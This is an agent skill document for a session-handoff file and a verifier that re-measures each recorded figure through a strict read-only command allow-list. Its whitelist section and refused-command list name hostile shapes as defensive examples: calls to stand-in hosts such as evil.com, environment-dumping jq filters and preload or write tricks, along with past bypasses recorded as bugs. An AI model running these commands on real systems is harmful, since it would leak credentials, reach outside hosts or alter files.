---
name: session-handoff
description: Write and re-read the project's session handoff — the "read this first if you are picking up work here" file at .agents/handoff.md. Write mode records project state in a fixed section order where every figure carries the command that produced it, keeping fast-decaying state apart from durable traps. Read mode RE-MEASURES every figure by re-running its command through a read-only whitelist and reports each line as confirmed / stale / unverifiable, so a reader never has to trust the date at the top. Use when starting work in a repo that has a handoff, when ending a session that should hand off, or when the user says "write a handoff", "refresh the handoff", "is the handoff still accurate?", or "what should I pick up".
---

# Session Handoff

> Adapted from a proposal staged by an `observe-work` review (observation #6, 2026-09-08). The
> contract below is the proposal's; the verifier, the parse rule, the whitelist and the tests are
> task.110's.

## Why this exists

A `.agents/handoff.md` opening with *"Read this first if you are picking up work here"* failed at
exactly that job three times, and every failure was structural rather than authorial:

1. **It decayed within a day and nothing said so.** The 2026-09-10 handoff named T107 as next and
   "the frontier is not empty"; T107 merged the next morning and the frontier was empty. The
   author had measured every figure and listed every command — the failure was a snapshot with no
   expiry and no re-measure step.
2. **It was written by hand with no procedure**, reconstructed from scratch each time.
3. **The durable half was interleaved with the decaying half.** Traps true for months sat beside
   state true for hours, so the half that decayed discredited the half that did not.
4. **Carried follow-ups were carried, not re-verified.** "Engine touched since" was written on
   09-10 about a file last touched 08-17.

Two ends fix this, and **the read end is what makes the write end worth doing**: a handoff whose
figures are re-measured on arrival cannot mislead about the frontier, the tip, or the counters.

## Read — re-measure before trusting

```bash
command node .agents/skills/session-handoff/scripts/handoff-verify.mjs            # table
command node .agents/skills/session-handoff/scripts/handoff-verify.mjs --json     # machine form
command node .agents/skills/session-handoff/scripts/handoff-verify.mjs path/to/handoff.md --timeout 120
```

Always `command node`, never bare `node` — see `docs/contributing/traps.md`. The verifier itself
needs no such prefix: it spawns each command **directly, with no shell**, so a shell-function `node`
can never be interposed. A leading `command ` in a handoff cell is stripped and ignored.

The script **never writes the handoff**. It parses the figures, re-runs each figure's command, and
prints one verdict per line:

| Verdict        | Meaning                                                                                        |
| -------------- | ---------------------------------------------------------------------------------------------- |
| `confirmed`    | the command ran and every figure on the line still holds                                       |
| `stale`        | the command ran and a figure has moved — **both** values are reported                          |
| `unverifiable` | the figure could not be checked here, and the `detail` says why (table below) — never a tick   |

`unverifiable` is a verdict, not an error. "The figure holds" and "I could not check" are the same
tick to a reader shown only a tick, and the reassuring reading is the one that gets taken. A Jira
check in a GitHub-tracked repo, a command the whitelist refuses, a suite that exceeds the timeout —
each is `unverifiable` with its reason, and none of them fails the run.

| `detail`                    | Cause                                                                                  |
| --------------------------- | -------------------------------------------------------------------------------------- |
| `no command`                | the Command cell has no backticked span (prose such as "inspect the catalog")          |
| `no figure`                 | a `cmd:` comment on a line with no bold span and no `expect:`                          |
| `not on whitelist: <bin>`   | the first token, or a flag on it, is not a read-only shape (see below) — **not executed** |
| `shell operator`            | the command contains `;` `&&` `\|` `>` `<` `$(` a backtick or a newline — **not executed** |
| `shell expansion not supported` | a token carries `*`, `~` or `$` — nothing expands without a shell, so it would run literally and diverge from what the author saw — **not executed** |
| `not on whitelist: <bin>`   | also: a flag the binary's allow-list does not name, an option prefix, a positional where the policy refuses one |
| `bad expect regex: …`       | an `expect:` written as `/…/` is not a valid regex (a path such as `/usr/bin/node` matches the shape) |
| `timeout (Ns)`              | exceeded `--timeout` (default 60 s). Expected for `npm test`; the read is a preflight  |
| `command failed (exit N)`   | non-zero exit on a line whose figure is not an `exit N` figure                         |
| `could not run: …`          | the runner threw (binary missing, cwd unreadable)                                      |

### Where the verifier finds a figure's command

- **The header table** `| Check | Command | Result |`: the **first backticked span** in the
  Command cell is the command. The **bold** spans in the Result cell are the figures; a Result cell
  with no bold span is compared as a whole.
- **A prose line** ending in `<!-- cmd: <command> -->`: the command for that line; the figures are
  the bold spans on the line. `<!-- cmd: <command>; expect: <figure> -->` overrides the figures with
  one explicit one — plain text, or `/regex/` for a range (`expect: /2026-09-(0[8-9]|[1-3][0-9])/`).
- Fenced code blocks are skipped entirely.

### How a figure is compared

- `**exit N**` is compared against the exit code. A non-zero exit on any other figure is
  `command failed (exit N)` — except for `grep` and `test`, whose exit 1 is a measurement (no match;
  false), so `` `grep -c x file` `` against `**0**` is `confirmed`.
- Any other figure is normalised (emphasis stripped, lower-cased, punctuation removed) and **every
  token must appear as a whole token in the command's output** — `b13` is not satisfied by `b130`.
  It is a token-subset match, not equality, because a recorded figure is a paraphrase of output.

**This is the write-side discipline the comparison imposes:** write bold figures as tokens that
appear verbatim in the output. `**0 failures**` against a runner that prints `0 failures` holds;
`**not re-run this session**` is prose, matches nothing, and will read `stale` the moment the
command runs — which is the correct verdict for a figure nobody measured.

### The whitelist — per-binary allow-lists

Commands run only through a read-only whitelist, and the whitelist is an **allow-list per binary**:
a token that starts with `-` must be in that binary's list — as an exact name, or as `name=value`
where the entry ends in `=` — and a token that does not must satisfy the binary's positional policy.
**Unknown ⇒ refused.** That is the whole design: git accepts unambiguous long-option *prefixes*
(`--del`, `--set-upstream-t=`), npm forwards `--check` to any script, `gh` has joined flag forms,
and a deny-list would have to enumerate every one of those; an allow-list refuses them by never
having heard of them. Two QA cycles of deny-list patching produced this (task.110 gates 1 and 2);
every shape both gates named is a refused-list test, and a property test asserts an unknown flag is
refused on every binary and every git subcommand.

The `command ` prefix is stripped before matching; a path to a binary (`/bin/ls`) is refused; **no
shell is involved**, so the argv the rule sees is the argv that runs — with one documented exception,
the `--no-install` the `npx` arm adds (below). After a `--`, the spec's **own** positional policy still
applies (`git diff --no-index -- /etc/hosts x` read an outside file through an arm that refuses a
leading `/` everywhere else — gate 7, QA-6).

| First token | Allowed shapes |
| --- | --- |
| `git` | one subcommand from `log` `show` `status` `rev-parse` `describe` `ls-files` `ls-remote` `diff` `rev-list` `cat-file` `blame` `shortlog` `branch` `tag` `remote`, each with its own flag list (see `GIT_SPECS`). No global options (`-C`, `-c`, `--git-dir`). `branch`/`tag` take a positional only with a list-selecting flag (`--list` `--contains` `--merged` `--points-at` …) — `-v` decorates, it does not select. `remote` only bare, `-v`, `get-url [--push|--all] <name>` — `remote show` is gone: git resolves an unconfigured name as a URL alias and queries it (`git remote show http://…/x.git` reached a local listener; the scp form invoked the reader's ssh — bug.13, executed), and `-v` + `get-url` answer a handoff without a round-trip; the `get-url` name is held to the `ls-remote` anchor. Positionals are relative refs/paths (no `..`, no leading `/`, no `C:/` drive letter) |
| `gh` | `pr` / `issue` / `repo` / `run` / `release` / `workflow` + `list` / `view` / `status` / `checks` / `diff` with list/view flags (`--json` `--jq` `--state` `--limit` …; never `--web`, and `-w` only under `run list`, where it is `--workflow` — on every `view` it is `--web`). A value-taking flag **consumes its next token**, so what remains is a genuine positional and is anchored: a number, a branch, a tag, a run id or a workflow file — no `:`, no `//`, never a URL. `--repo` / `-R` is exactly `OWNER/REPO`: gh reads `[HOST/]OWNER/REPO` and sends the request to HOST, so `-R 127.0.0.1:8099/o/r` was an egress (bug.9, executed); `repo view` takes `NAME` or `OWNER/NAME` for the same reason. `api <path>` first — a path on the authenticated host, never a URL (`://` and a leading `//` are refused: gh sends an absolute endpoint to that host as-is) — then only read-shaping flags (`--jq` `--paginate` `--cache` `--template` `-i` `-H` …) — no `--hostname`, no method or field flags. A `--jq` / `-q` filter, on `api` and on every `list`/`view`, is held to the same rule as `jq`'s: it may not name the `env` builtin — gh evaluates it with gojq, which has `env` too (5c CR-3) |
| `node` | **Runnable code is named by identity, never by shape.** Allow-listed leading flags (`--test`, `--test-concurrency=`, `--test-reporter=` **built-in names only**, `--enable-source-maps`, `--no-warnings`, `--max-old-space-size=` …), then **one of an exact list of read-only entry points**, each with its own spec for what may follow it — the `NPM_SCRIPTS` discipline applied to scripts: `develop-next/scripts/select-next.mjs` (`--lint`, `--batch`, the three `--*-registry`/`--roadmap` relative paths; no positional) and `observation-log.js` (under any skill's bundled `references/` directory, or at its shared source; **read verbs only** — `doctor` `scan` `queue` `families` — with `--json` `--quiet` `--audit` and a `--workspace` / `--audit-root` that may be absolute, because the log lives outside the repo; `write` `init` `set-status` `archive` `checkpoint` refused, and so is `next-id`, which archives resolved entries and writes the id floor — bug.12, executed). Each is matched at this repository's `skills/…` path and at a consumer's `.agents/skills/…` path. **In `--test` mode there is no positional at all**: `node --test` (with `--test-name-pattern=`, `--test-only`, a built-in reporter …) is node's own discovery — the `*.test.*` patterns, `node_modules` excluded — which is what `npm test` runs; node keeps parsing its own options, so every dash token is held to the same list. A handoff that wants one suite names it by `--test-name-pattern=`, or reads `unverifiable` and lets the reader run it. Three gates struck the previous rule, which admitted a path by its form: gate 6 (`npm test -- /tmp/pre.js` preloaded a file, bug.6), gate 7 (`node node_modules/prettier/bin/prettier.cjs --write x` rewrote a file, bug.8) and gate 8 (`node --test skills/loop-supervisor/scripts/run-loop.mjs` ran the supervisor bare — node executes an explicitly named file as a test whatever its name — and spawned two `claude -p` sessions from read mode, bug.11); the third strike replaced the rule rather than listing one more shape |
| `python3` | `-u -B -O -OO -q -s -E -I -W… -X…`, then the one listed entry point — `create-skill/scripts/quick_validate.py <relative skill dir>` — at either install path; `-c`, `-m`, `-`, and every other script (`generate_catalog.py`, `bundle_skill.py`, `package_skill.py`) refused |
| `npm` | `test` / `run test`, optionally `-- args` where the args are held to the **node `--test`-mode rule** — flags only, no positional (the tail of `npm test` is `node --test …`, so `-- -r /tmp/x` would preload `/tmp/x` and `-- scripts/x.mjs` would run it); `run` of exactly `ci` `ci:fast` `format:check` `bundle:check` `validate` `validate:all` `test:platform` `test:tracker-access` `test:bitbucket-auth` or any `eval:*` **except `eval:*:cli` / `eval:*:sdk`** (live, billed agent runs), each with **no tail at all** — `-- --write` on `format:check` reaches `prettier --check . --write` and prettier honours the write; `run bundle -- --check` as that exact argv and nothing else; `ls`, `view` with **bare package names only** (`@scope/name@range`, and a field selector such as `version` or `dist-tags.latest`) — a package spec may be a tarball URL, a `git+…` URL, a `file:` path or the GitHub shorthand `owner/repo`, and npm fetches every one of those (bug.9, executed against a local listener) |
| `npx` | one of `prettier` `eslint` `tsc` `markdownlint` `markdownlint-cli2` `stylelint` `jest` `vitest` `mocha` `shellcheck`, each with its own read-only flag list (`tsc` **requires** `--noEmit` and refuses a `true`/`false` token after it — tsc reads that as the flag's *value*, and `--noEmit false <file>` emitted into the tree (5c CR-1, executed); `vitest` **requires** `--run`; `mocha` takes **no positional** — it runs an explicitly named file whatever its name, so its own `spec` / `.mocharc` discovers, exactly as `node --test` does; no `-o`, `--coverage`, `--cache`, `--fix`, `--write`). **A flag value the tool would load is held by kind, never by path**: a config (`--config=` `-c` `--ignore-path=` `-p`) is a **data** file — `.json` `.jsonc` `.json5` `.yaml` `.yml` `.toml`, or a `.<tool>rc` / `.<tool>ignore` dotfile such as `.prettierrc` / `.markdownlintrc` / `.prettierignore` — at a relative path with no `..`, and a formatter or reporter (`--format=` `-f` `--formatter=` `--reporter=` `-R` `--reporters=`, shellcheck's `-f` `-s` `-S`) is one of **its tool's stdout-only built-ins**, listed exactly (mocha `spec` `dot` `nyan` `tap` `landing` `list` `progress` `json` `json-stream` `min` `doc` `markdown` `xunit` `html`; vitest `default` `verbose` `dot` `tap` `tap-flat` `github-actions` `json` `junit` — not `html`/`blob`, which write, nor `basic`, gone in Vitest 4; jest `default` `summary` `github-actions`; eslint `stylish` `json` `json-with-metadata` `html` — ESLint 9's core set, since the ESLint 8 names now resolve to an installed package first; stylelint its documented formatters; shellcheck its formats, shells and severities). ESLint's own `-c` / `--config` is data by **extension only** (`.json` `.jsonc` `.yaml` `.yml`) — ESLint 9 `import()`s whatever `-c` names and Node parses an extensionless dotfile as JavaScript. A bare *name* was the gate-9 rule and gate 10 executed its counter-example: mocha resolves a name it does not know by `require(path.resolve(name))`, so `npx mocha -R zzrep t` ran a root-level `zzrep.js` (bug.17). `.prettierrc.js`, `.env`, `--config=x.mjs`, `-f ./x.js`, `-R index` are refused for what they are: prettier `import()`s a `.mjs` config and runs its top level under prettier's own argv, and this repository ships a module that calls `main()` at import — through read mode it rewrote a PRD (bug.14, executed). Gates 3–8 had accepted that as "in-repo code is trusted"; the code was, the invocation was not. A positional under `vitest` is never one of its **subcommands** (`run`, `watch`, `dev`, `bench`, `typecheck`, `related`, `list`, `init`), and mocha takes none: `npx mocha init out` scaffolded four files (bug.15, executed). **`--no-install` is injected into the argv that runs** — write `npx prettier --check .` and `npx --no-install prettier --check .` runs — because the runner is non-TTY with `CI=1`, under which npm 11 installs a missing tool from the registry without a prompt (bug.10, executed: `npx cowsay` printed "will be installed" and ran), and most of the tools on this list are absent from a given repo's `node_modules`. A missing tool is now `npx canceled due to missing packages` — an exit 1 the line reads as `stale`, never an install. This is the one place the approved argv and the running argv differ, and only by a flag that removes a capability. `--no` is refused, not accepted as an alias: npx 7+ treats it as an unknown option and swallows the tool name as its value. Residual: npm still resolves the tool's **name** against the registry before it decides not to install — one manifest GET, no code fetched |
| `grep` `ls` `wc` `cat` `head` `tail` `stat` `test` `jq` `find` `shellcheck` | their read-only flags (`tail -f` is not one; `find` has no `-exec`/`-delete`/`-fprint*`); absolute paths are allowed for these plain readers only. A `jq` positional may not contain the bare word `env` (`.env` the key is fine; a file named `env.json` is not, and that is the price): `jq -n env` printed the verifier's inherited environment, tokens included, into the measured figure (QA-4, executed), and the gate-9 exemption for a `/` before the word was jq's `//` operator — `jq -n null//env` printed it again (bug.18, executed). `$ENV` was already refused with every other `$` |
| `date` | read flags and `+format`; a bare positional sets the clock and is refused |

Refused by construction: `git push`, `git branch -D`, `git branch --del`, `git tag v1`, `git remote -v add`,
`git ls-remote --upload-pack=`, `--output=`, `gh pr merge`, `gh api -XPOST`, `gh api --hostname`, `gh api https://evil.example/x`,
`node -e`, `node --test x/ -r pre.js`, `npm test -- -r /tmp/pre.js`, `npm run format:check -- --write`, `python3 -c`, `npm run format --check`, any script not on the exact list (`lint:fix`, `build`, `generate-catalog`),
`node node_modules/prettier/bin/prettier.cjs --write x`, `node …/registry-tick.js`, `node …/observation-log.js write`, `node …/observation-log.js next-id`, `python3 skills/create-skill/scripts/generate_catalog.py`,
`node --test <any in-repo file>` (`generate-skill-dependencies.mjs` re-created a tracked file; `run-loop.mjs` spawned `claude -p`), `npm test -- scripts/x.mjs`, `node --test skills/x/tests/y.test.js` (no path positional in test mode — see the `node` row), `git remote show origin`, `git remote show git@evil:x.git`,
`gh pr list -R evil.com/o/r`, `gh repo view https://evil/o/r`, `gh pr view 1 -w`, `npm view http://evil/pkg.tgz`, `npm view git+ssh://…`, `npm view owner/repo`, `npx --no prettier --check .`,
`npx prettier --write=.`, `npx tsc` (no `--noEmit`), `npx tsc --noEmit false x.ts`, `npx mocha <any file>`, `gh api /user --jq env`, `npx vitest` (no `--run`), `npx prettier --config=x.mjs .`, `npx eslint -c <any in-repo .js> .`, `npx eslint -f ./x.js .`, `npx mocha -R ./x.js`, `npx mocha init out`, `npx vitest init browser`, `npx mocha -R index t`, `npx vitest --run --reporter=html x`, `npx jest --reporters=jest-junit`, `jq -n env`, `jq -n null//env`, `find -fprint`, `date 0101120026`, `rm`, `sudo`,
any `|` `;` `&&` `>` `<` `$(` backtick or newline **as a token** — a quoted `'a|b'` is a pattern; an unterminated quote is `unverifiable`, and an empty `""` is a token (`grep -c "" f` runs with four arguments, not three — bug.16).
The specs live in the script (`GIT_SPECS`, `GH_LIST_VIEW_*`, `GH_API_FLAGS`, `NODE_FLAGS`, `NODE_SCRIPTS`,
`PY_SCRIPTS`, `NPM_SCRIPTS`, `NPM_PKG_SPEC`, `NPX_TOOLS`, `UTIL_SPECS`) and in its tests; change both together.
A handoff that needs a script not on `NODE_SCRIPTS` / `PY_SCRIPTS` reads `unverifiable: not on whitelist`
for that line — add the entry point **with its own spec** rather than widening the arm.

A command whose exit code *is* the answer — `jq -e`, `git diff --quiet`, `git ls-remote --exit-code` — is written with an **`exit N`** figure (`**exit 1**`), because only `grep` and `test` have exit 1 read as a measurement by default; any other non-zero exit without an `exit N` figure is `unverifiable: command failed`.

**Timeout — and interruption — kill the whole process group.** The command is spawned detached and
asynchronously; on `--timeout`, and on SIGINT/SIGTERM to the verifier, the group is killed, so a
ten-minute `npm test` does not keep running after `unverifiable: timeout` or after Ctrl-C.

### `--json`

One object on stdout: `{ reason, file, counts: {confirmed, stale, unverifiable}, lines: […], exitCode }`.
Each line carries `line`, `check`, `command`, `recorded`, `verdict`, `detail`, `measured`.

| `reason`       | When                                                                | Exit |
| -------------- | ------------------------------------------------------------------- | ---- |
| `ok`           | every figure confirmed                                              | 0    |
| `stale`        | at least one figure moved — information, not failure                | 0    |
| `unverifiable` | nothing stale, at least one figure could not be checked             | 0 — **1 when nothing at all could be checked**, which is a claim about the instrument, not the handoff |
| `no-figures`   | the file parsed but carries no figure                               | 1    |
| `missing`      | the file does not exist                                             | 1    |
| `usage`        | bad arguments (`--help` prints usage with exit 0)                   | 2    |

Read `reason`, not just the exit code.

## Write — the fixed section order

Write mode is a procedure the agent follows with [`assets/handoff.template.md`](assets/handoff.template.md);
the verifier never writes. Steps:

1. **Measure first.** Run every command in the template's header table and record the figures as
   bold tokens that appear verbatim in the output. Add rows for anything else this session leaves
   worth checking, each with its command.
2. **Fill the sections in this order** — the split between the last two is the point of the format:

   | Section                       | Half-life      | Rule                                                                     |
   | ----------------------------- | -------------- | ------------------------------------------------------------------------ |
   | Header table (project state)  | hours to days  | every figure carries the command that produced it, inline                |
   | 1. What to pick up            | days           | re-verify at write time; **never carry forward** from the previous file  |
   | 2. Standing decisions         | long           | decisions taken and deliberately not revisited                           |
   | 3. Carried follow-ups         | days           | status **re-measured**, not copied; each carries its command             |
   | 4. Tolerated drift            | long           | known-wrong things deliberately not being fixed                          |
   | 5. Traps                      | durable        | **a pointer only** to `docs/contributing/traps.md` — never content       |
   | 6. Where the artifacts are    | medium         | paths, not descriptions                                                  |

3. **Never carry a figure forward.** A handoff that quotes its predecessor has an age that is
   unbounded and unstated. If a figure was not re-measured this session, say so in the cell and
   accept that read mode will report it `stale`.
4. **Keep the traps out.** A trap that has cost a session twice goes to `docs/contributing/traps.md`;
   §5 stays one paragraph pointing there.
5. **Prove it before committing**: run read mode on the file you just wrote. Every table row should
   be `confirmed`; `unverifiable` rows should each have a reason you accept (`timeout` on the full
   suite is fine — the reader can run it).

## Discoverability

The handoff must be linked from the always-loaded agent file (`AGENTS.md` / `CLAUDE.md`), and that
line must name read mode as the way to consume it. Without the link a new reader never reaches the
document; without the read-mode pointer they trust the date.

## Related

- `docs/contributing/traps.md` — where the durable half lives.
- `tracker-reconcile` — the same check-then-report shape (`satisfied / divergent / unverifiable`)
  applied to a committed tracker handover against a live board.
- `observe-work` — where the proposal for this skill came from.
